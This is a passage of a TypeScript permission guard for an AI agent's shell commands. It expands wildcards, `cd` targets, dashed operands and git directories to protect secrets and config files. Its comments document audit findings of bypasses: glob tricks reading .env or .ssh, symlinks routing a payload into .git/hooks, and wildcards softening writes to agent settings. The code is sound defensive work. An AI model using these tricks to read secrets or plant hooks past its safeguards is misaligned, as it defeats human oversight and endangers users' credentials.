  return r.physical[0] ?? r.lexical[0]!;
}

/**
 * The directories a `cd`-like word may leave the shell in. `cd d/..` goes two places: LOGICAL (the default) applies `..`
 * to the text of $PWD, PHYSICAL (`-P`, `set -P`, zsh's chase_dots) follows the link first, and which one the shell uses
 * can be changed by an earlier line — so unless the command says `-P` itself, both are possible. Null when the word is
 * dynamic, or names the directory stack.
 */
export function directoryCandidates(base: string, word: string, physicalOnly = false): string[] | null {
  const r = readVariant(word, directoriesOf(base), undefined, { uncertain: null });
  // a glob in a `cd` word is expanded by the shell into a name nobody here can enumerate
  if (r === null || r.glob || r.lexical.length === 0) return null;
  const logical = canonicalPath(r.lexical[0]!);
  const physical = r.physical[0] ?? logical;
  // THE WORD AS TYPED is another place the shell may be left: `cd '~+'/..` is the directory called `~+` and then its parent, where an unquoted
  // `~+` is the working directory (PA-03; found by the filesystem oracle, which `cd`'d through such a link into the hooks). It counts where the
  // directory exists - a `cd` into a name that is not there leaves the shell where it was, and `cd ~/proj` is not also the directory `~`.
  const typed = r.typed.length > 0 && isDirectory(isAbsolute(word) ? word : join(base, word)) ? r.typed.map(canonicalPath) : [];
  const out = new Set<string>(physicalOnly ? [physical] : [logical, physical]);
  for (const t of typed) out.add(t);
  return [...out];
}

/* ------------------------------------------------------------------------------------------------------------- *
 * The SET of names a wildcard can match
 *
 * A glob word was judged by its LITERAL PREFIX: `.e*` is `.e`, a name that does not exist, so `cat .e*` read `.env` at
 * ALLOW (r11-95), and a search tool's `glob: "*"` — which, like every explicit glob, overrides the tool's skip-hidden
 * default — printed it (r11-96). A wildcard denotes the names that exist and match it, so that is what it is judged by:
 * the directory is read, the segment is matched, the matches are classified like any other path.
 *
 * THE EXPANSION IS BOUNDED, and a bound is a question rather than an absence: after GLOB_ENTRY_BUDGET entries read, or
 * on syntax this does not enumerate (an extended glob), `bounded` says the set is a lower bound and the caller asks.
 * ------------------------------------------------------------------------------------------------------------- */

/** How many directory entries one expansion may read before it is read as unbounded (a few milliseconds of `readdir`). */
export const GLOB_ENTRY_BUDGET = 20000;
/** How many names one expansion may return (each is classified by the caller: a few tenths of a millisecond apiece). */
const GLOB_RESULT_BUDGET = 2000;
/** A recursive `**` does not descend into a dependency tree: what a package ships is not the user's secret, and the tree is
 *  larger than every budget. (A wildcard written INTO it, `node_modules/*`, is expanded like any other.) */
const GLOB_SKIPPED_DIRS: ReadonlySet<string> = new Set(['node_modules']);

export interface GlobMatches {
  /** absolute paths of the names that exist and match (a literal segment after a wildcard is appended whether or not it exists) */
  readonly paths: string[];
  /** which of them are directories: a directory's CONTENTS are what a rule about it describes */
  readonly directories: ReadonlySet<string>;
  /** the expansion stopped at a budget or met syntax it does not enumerate: `paths` is a lower bound */
  readonly bounded: boolean;
  /** the word has a part nobody can know (`$VAR`, a substitution): nothing was expanded */
  readonly dynamic: boolean;
  /** the directories that hold the names that matched, ALL of them - also the ones `keep` dropped (see `keep`) */
  readonly parents: ReadonlySet<string>;
}

/** What a name that matched a wildcard is, as the directory listing says it: a directory, a symbolic link (whatever it points at),
 *  or a plain entry. A name that did not come from a listing (the literal segment after a wildcard) has no kind. */
export type GlobKind = 'directory' | 'link' | 'plain';

const POSIX_CLASSES: Readonly<Record<string, string>> = {
  alpha: 'a-zA-Z', digit: '0-9', alnum: 'a-zA-Z0-9', upper: 'A-Z', lower: 'a-z', space: '\\s', punct: '!-\\/:-@\\[-`{-~', xdigit: '0-9a-fA-F', word: 'a-zA-Z0-9_',
};
const escapeRe = (c: string): string => c.replace(/[\\^$.|?*+()[\]{}/-]/g, '\\$&');
/** `^x`, `x~y`, `x#` and `<1-9>` are patterns only where the shell reads extended ones */
const EXTENDED_PATTERN = /[\^#<]|.~/;
const hasWildcard = (seg: string, extended = false): boolean => /[*?[(|]/.test(seg) || (extended && EXTENDED_PATTERN.test(seg));

/** One path segment of a glob as a regular expression, or null for syntax this does not enumerate (an extended glob, `a|b`,
 *  a character class it cannot read). */
function segmentRegExp(seg: string, ignoreCase = false, extended = false): RegExp | null {
  if (extended && EXTENDED_PATTERN.test(seg)) return null;
  let re = '';
  for (let i = 0; i < seg.length; i++) {
    const c = seg[i]!;
    if (c === '\\') {
      re += escapeRe(seg[++i] ?? '\\');
    } else if (c === '*') {
      while (seg[i + 1] === '*') i++;
      re += '[^/]*';
    } else if (c === '?') re += '[^/]';
    else if (c === '[') {
      let j = i + 1;
      const negated = seg[j] === '!' || seg[j] === '^';
      if (negated) j++;
      const bodyAt = j;
      if (seg[j] === ']') j++;
      for (; j < seg.length && seg[j] !== ']'; j++)
        if (seg[j] === '[' && seg[j + 1] === ':') {
          const end = seg.indexOf(':]', j + 2);
          if (end < 0) return null;
          j = end + 1;
        }
      if (j >= seg.length) re += '\\[';
      else {
        let body = '';
        const raw = seg.slice(bodyAt, j);
        for (let k = 0; k < raw.length; k++) {
          if (raw[k] === '[' && raw[k + 1] === ':') {
            const end = raw.indexOf(':]', k + 2);
            const named = POSIX_CLASSES[raw.slice(k + 2, end)];
            if (named === undefined) return null;
            body += named;
            k = end + 1;
          } else body += raw[k] === '\\' || raw[k] === ']' || raw[k] === '^' ? `\\${raw[k]}` : raw[k]!;
        }
        re += `[${negated ? '^' : ''}${body}]`;
        i = j;
      }
    } else if (c === '|') return null;
    else if (c === '(' || c === ')') {
      // a parenthesis is a group only with its partner in the same segment (`@(a|b)`, `(a|b)`); alone it is a character in every shell, and the
      // program text that holds one beside a slash and a star - `console.log("a/*")`, `print("/tmp/*")` - is not an extended pattern
      if (c === '(' ? seg.indexOf(')', i + 1) >= 0 : seg.lastIndexOf('(', i) >= 0) return null;
      re += escapeRe(c);
    } else re += escapeRe(c);
  }
  try {
    return new RegExp(`^${re}$`, ignoreCase ? 'si' : 's');
  } catch {
    return null;
  }
}

/**
 * The names a glob WORD matches, in each directory the shell may be in. `dotfiles` is whether a wildcard matches a name that
 * begins with a dot: a shell's does not (unless `dotglob`/`GLOB_DOTS` is set, or zsh's `(D)` qualifier is on the word); a
 * search tool's explicit glob does (it overrides the hidden-file default). A segment that itself begins with a literal dot
 * (`.e*`) always may. Braces are the caller's to expand first. `keep` narrows the answer to the names the caller will judge
 * (a catch-all over a tree matches every file in it, and only the hidden ones can be credentials), before the result budget
 * is spent: a name it drops is not "bounded", it is not asked about.
 */
export function globMatches(
  cwds: string | readonly string[],
  word: string,
  old: readonly string[] | undefined,
  options: {
    dotfiles: boolean;
    /** the shell matches a name whatever its case (`shopt -s nocaseglob`, zsh's `unsetopt CASE_GLOB`) */
    ignoreCase?: boolean;
    /** the shell reads extended patterns (`^x`, `x~y`, `x#`, `<1-9>`): a word that uses one is not enumerated here */
    extended?: boolean;
    /** whether the caller will judge this name. `kind` is what the directory listing said it is, when it did: a name the caller
     *  drops is not "bounded", it is not asked about - and a caller that drops the plain entries judges the DIRECTORIES they
     *  are in instead (`parents`), once each */
    keep?: (path: string, kind: GlobKind | undefined) => boolean;
  },
): GlobMatches {
  const none: GlobMatches = { paths: [], directories: new Set(), bounded: false, dynamic: true, parents: new Set() };
  const dirs = directoriesOf(cwds);
  let text = word;
  let dotfiles = options.dotfiles;
  // zsh's glob qualifiers: `.e*(N)`, `*(D)`. `D` is "match dotfiles"; the others only select by type or by flag
  const qualifier = /\(([A-Za-z0-9^.,:@/*%=+<>-]*)\)$/.exec(text);
  if (qualifier !== null && qualifier.index > 0) {
    text = text.slice(0, qualifier.index);
    if (qualifier[1]!.includes('D')) dotfiles = true;
  }
  const texts = expandStart(text, dirs, old, { uncertain: null });
  if (texts === null || texts.some((x) => /[$`]/.test(x))) return none;
  const budget = { entries: GLOB_ENTRY_BUDGET, bounded: false };
  const found = new Set<string>();
  const directories = new Set<string>();
  const kinds = new Map<string, GlobKind>();
  const style = { ignoreCase: options.ignoreCase === true, extended: options.extended === true };
  for (const t of texts) for (const base of isAbsolute(t) ? [sep] : dirs) expandGlobText(base, t, dotfiles, style, budget, found, directories, kinds);
  const keep = options.keep;
  const paths = keep === undefined ? [...found] : [...found].filter((f) => keep(f, kinds.get(f)));
  const parents = new Set<string>();
  for (const f of found) parents.add(dirname(f));
  return { paths: paths.slice(0, GLOB_RESULT_BUDGET), directories, bounded: budget.bounded || paths.length > GLOB_RESULT_BUDGET, dynamic: false, parents };
}

function expandGlobText(
  root: string,
  text: string,
  dotfiles: boolean,
  style: { ignoreCase: boolean; extended: boolean },
  budget: { entries: number; bounded: boolean },
  found: Set<string>,
  directories: Set<string>,
  kinds: Map<string, GlobKind>,
): void {
  const segments = text.split('/').filter((s) => s !== '' && s !== '.');
  let frontier: string[] = [root];
  /** the entries of a directory, or none when it cannot be read; each one read is paid for */
  const entriesOf = (dir: string): Array<{ name: string; directory: boolean; link: boolean }> | null => {
    let list = listings?.get(dir);
    if (list === undefined) {
      let read;
      try {
        read = readdirSync(dir, { withFileTypes: true });
      } catch {
        read = null;
      }
      // (paid for outside the `try`, once, when the disk is asked)
      if (read !== null) chargeListing(read.length);
      list = read === null ? null : read.map((e) => ({ name: e.name, directory: e.isDirectory(), link: e.isSymbolicLink() }));
      listings?.set(dir, list);
    } else if (list !== null) {
      // a listing already read is not read again, but every word that matches against it still looks at every entry
      chargeWork(list.length * ENTRY_VISIT_COST);
    }
    if (list === null) return null;
    budget.entries -= list.length;
    if (budget.entries < 0) {
      budget.bounded = true;
      return null;
    }
    return list;
  };
  for (let idx = 0; idx < segments.length && !budget.bounded; idx++) {
    const seg = segments[idx]!;
    const last = idx === segments.length - 1;
    if (seg === '..') {
      // THE PARENT OF THE DIRECTORY REACHED, which is not the parent of its name when the name is a link: `./ls*/../.ssh/` matches the link `lssh`,
      // and the shell opens the home directory's `.ssh` (found by the filesystem oracle). Both parents stay: the text's, and the disk's.
      const up = new Set<string>();
      for (const p of frontier) {
        up.add(dirname(p));
        const real = canonicalPath(p);
        if (real !== p) up.add(dirname(real));
      }
      frontier = [...up];
      continue;
    }
    if (seg === '**') {
      // zero or more directories; as the LAST segment it is every name below
      const next = new Set<string>();
      const queue = [...frontier];
      for (const p of frontier) next.add(p);
      while (queue.length > 0 && !budget.bounded) {
        const dir = queue.shift()!;
        for (const e of entriesOf(dir) ?? []) {
          const here = join(dir, e.name);
          if (last) {
            next.add(here);
            if (e.directory) directories.add(here);
            kinds.set(here, e.directory ? 'directory' : e.link ? 'link' : 'plain');
          }
          if (!e.directory || GLOB_SKIPPED_DIRS.has(e.name) || (!dotfiles && e.name.startsWith('.'))) continue;
          if (!last) next.add(here);
          queue.push(here);
        }
      }
      frontier = [...next];
      continue;
    }
    if (!hasWildcard(seg, style.extended)) {
      frontier = frontier.map((p) => join(p, seg));
      continue;
    }
    const re = segmentRegExp(seg, style.ignoreCase, style.extended);
    if (re === null) {
      // a segment nobody enumerates (an extended pattern, `a|b`, a parenthesis) leaves the answer open only where there is a directory to match it
      // in: below a name that does not exist the shell matches nothing, and the text of a program that holds a slash and a bracket - `sed
      // 's/(foo)/[\1]/'`, `node -e 'console.log("/**")'` - is not a place to look (it was a word without its quotes, and now it is the word)
      if (frontier.some((p) => isDirectory(p))) budget.bounded = true;
      return;
    }
    const next: string[] = [];
    for (const p of frontier) {
      for (const e of entriesOf(p) ?? []) {
        if (e.name.startsWith('.') && !dotfiles && !seg.startsWith('.')) continue;
        if (!re.test(e.name)) continue;
        const here = join(p, e.name);
        if (e.directory) directories.add(here);
        kinds.set(here, e.directory ? 'directory' : e.link ? 'link' : 'plain');
        next.push(here);
      }
    }
    frontier = next;
  }
  for (const p of frontier) found.add(p);
}

export interface WildcardNames {
  /** the concrete paths to judge: the names that exist and match, and the word as typed (a name, since the shell leaves a pattern that
   *  matches nothing as it is) */
  readonly paths: string[];
  /** how many existing names matched */
  readonly matched: number;
  /** why the set is not the whole answer - the word is built at run time, or it matches more names than are enumerated - or null */
  readonly open: string | null;
}

/**
 * WHAT A WILDCARD WORD DENOTES WHERE THE COMMAND WRITES IT (closure audit 2026-10-02, PA-09). A wildcard destination was never enumerated:
 * `touch .har?ess/generated/x` and `echo x > .cla[u]de/settings.json` (or a star in the same place) were an ASK a human can approve, where the spelled-out path is an absolute
 * refusal, and `rm *.log` was an ASK for a name that matches only ordinary files. A wildcard denotes the names that exist and match it, so
 * those are the destinations: the caller judges each of them as the path it is. A pattern that matches nothing is left as it is by the
 * shell, and is a name (its typed reading). `open` is the question the names do not answer.
 */
export function wildcardNames(
  cwds: string | readonly string[],
  word: string,
  old: readonly string[] | undefined,
  options: { dotfiles: boolean; ignoreCase?: boolean; extended?: boolean },
): WildcardNames {
  const c = pathCandidates(cwds, word, old);
  if (c.dynamic) return { paths: [], matched: 0, open: 'the word is built at run time' };
  if (!c.glob) return { paths: c.paths, matched: 0, open: c.uncertain };
  const set = globMatches(cwds, word, old, options);
  if (set.dynamic) return { paths: [...c.typed], matched: 0, open: 'the word is built at run time' };
  const paths = new Set<string>(set.paths);
  for (const t of c.typed) paths.add(t);
  return { paths: [...paths], matched: set.paths.length, open: set.bounded ? 'it matches more names than this kernel enumerates' : c.uncertain };
}

/**
 * What listing a directory costs, in the units of work-bound.ts: a syscall and a pass over what it returned (measured at about half a
 * microsecond an entry). The budget of one wildcard expansion bounds ONE word; a command that names a wildcard over a directory of twenty
 * thousand entries fifteen hundred times read it fifteen hundred times, and took thirteen seconds. Every place that lists a directory
 * while deciding pays this AFTER the listing (the size is not known before), so the first list over the limit is the last. (The wildcard
 * expander reads a directory once per decision, `listings`, and pays only for the entries each word looks at after that.)
 */
const DIR_READ_COST = 500;
const DIR_ENTRY_COST = 3;
/** looking at one entry of a listing already in hand: a pattern test */
const ENTRY_VISIT_COST = 1;
export function chargeListing(entries: number): void {
  chargeWork(DIR_READ_COST + entries * DIR_ENTRY_COST);
}

/**
 * Is this path an existing directory? Asked of the disk once per decision (the view of the filesystem a decision shares, `withPathCache`)
 * and paid for in the units of work-bound.ts: a command that moves into a directory that is not there ten thousand times asks the
 * same question ten thousand times, and each failed `stat` is a syscall that throws.
 */
export function isDirectory(abs: string): boolean {
  const key = `\0dir\0${abs}`;
  const known = cache?.get(key);
  if (known !== undefined) return known === '1';
  chargeWork(WALK_STEP_COST);
  let is: boolean;
  try {
    is = statSync(abs).isDirectory();
  } catch {
    is = false;
  }
  cache?.set(key, is ? '1' : '0');
  return is;
}

/**
 * Is this word ONE PLAIN NAME - no slash, no quoting, glob or expansion character, not an option - that names an entry of `dir`? A bare
 * word is a path operand exactly when there is something of that name where the command runs; the scan that took only words that LOOK
 * like paths never asked about `cat service-account.json` (review 11 #117). It is asked here, with the other readers that join a directory
 * and a word, because a plain name has no `..` and no link to follow: the join is the whole of its meaning.
 */
export function namesAnEntry(dir: string, name: string): boolean {
  // (a name is what is on the disk, whatever characters it holds: `a"b` and `a<b` are links the hostile repository ships, and the existence
  // test below is what keeps `$HOME`, `a=b` and `*` - words that name nothing - out; only an option, an empty word and a path are not a plain name)
  if (name === '' || name.length > 255 || name.startsWith('-') || name.includes('/') || name.includes('\0')) return false;
  chargeWork(WALK_STEP_COST);
  try {
    lstatSync(join(dir, name));
    return true;
  } catch {
    return false;
  }
}

/**
 * Is this word - which BEGINS WITH A DASH - the name of something that exists where the command runs? `cp payload -dash/pre-commit` is a
 * copy into `-dash/` for a parser that stops looking for options at the first operand (BSD's, the one macOS has), and `cp payload --
 * -dash/pre-commit` is one for every parser; the operand readers skip every word that starts with a dash because it is an option, and a
 * link called `-dash` that leads into .git/hooks was written through without a hit (PA-03). The question is asked of the disk, so an
 * ordinary option (`-r`, `-Ix`) - which names nothing - is still an option. Only the first component is looked up: it is the one
 * that can be a link, and the rest of the name is read by `pathCandidates` like any other.
 */
export function namesADashedEntry(dir: string, word: string): boolean {
  if (word.length < 2 || word[0] !== '-' || word === '--') return false;
  const slash = word.indexOf('/');
  const first = slash < 0 ? word : word.slice(0, slash);
  chargeWork(WALK_STEP_COST);
  try {
    lstatSync(join(dir, first));
    return true;
  } catch {
    return false;
  }
}

/** THE GIT DIRECTORY OF A WORK TREE: its `.git` when that is a directory, or the directory a `.git` FILE names (`gitdir: PATH` - a linked worktree,
 *  a submodule, `git init --separate-git-dir`, a bare checkout's `.bare`), read as the file that will be opened. Null when there is none. The one
 *  reader of where a repository's git directory is: the index reader, and the places the protected `.git/hooks` and `.git/config` really are (PA-07). */
export function gitDirOf(root: string): string | null {
  const dotGit = join(root, '.git');
  try {
    const st = statSync(dotGit);
    if (st.isDirectory()) return dotGit;
    if (!st.isFile() || st.size > 4096) return null;
    const m = /^gitdir:\s*(.+?)\s*$/m.exec(readFileSync(dotGit, 'utf8'));
    return m ? openedPath(root, m[1]!) : null;
  } catch {
    return null;
  }
}
